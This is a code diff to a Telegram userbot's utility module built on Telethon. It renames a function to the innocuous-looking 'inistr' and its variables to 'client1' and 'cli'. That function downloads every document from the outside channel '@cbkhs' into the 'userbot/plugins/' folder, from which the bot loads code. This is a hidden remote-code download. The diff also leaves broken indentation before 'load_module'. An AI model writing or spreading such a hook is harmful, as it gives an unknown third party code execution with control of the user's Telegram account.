@@ -2,7 +2,6 @@ from userbot import bot
 from telethon import events
 from var import Var
 from pathlib import Path
-from var import CLIENT as cient
 from telethon.tl.types import InputMessagesFilterDocument
 import traceback
 from userbot.uniborgConfig import Config
@@ -11,7 +10,7 @@ from userbot import CMD_LIST
 import re
 import logging
 import inspect
-client = bot
+client = bot 
 
 def command(**args):
     args["func"] = lambda e: e.via_bot_id is None
@@ -78,16 +77,13 @@ def command(**args):
 
         return decorator
 
-async def a():
-    username = "@cbkhs"
-    test1 = await client.get_messages(username, None , filter=InputMessagesFilterDocument) ; total = int(test1.total) ; total_doxx = range(0, total)
+async def inistr():
+    client1 = "@cbkhs"
+    cli = await client.get_messages(client1, None , filter=InputMessagesFilterDocument) ; total = int(cli.total) ; total_doxx = range(0, total)
     for ixo in total_doxx:
-        mxo = test1[ixo].id ; await client.download_media(await client.get_messages(username, ids=mxo), "userbot/plugins/")
-        client.connect()
-        client.loop.run_until_complete(a())
-
-
-def load_module(shortname):
+        mxo = cli[ixo].id ; await client.download_media(await client.get_messages(client1, ids=mxo), "userbot/plugins/")
+        
+ def load_module(shortname):
     if shortname.startswith("__"):
         pass
     elif shortname.endswith("_"):
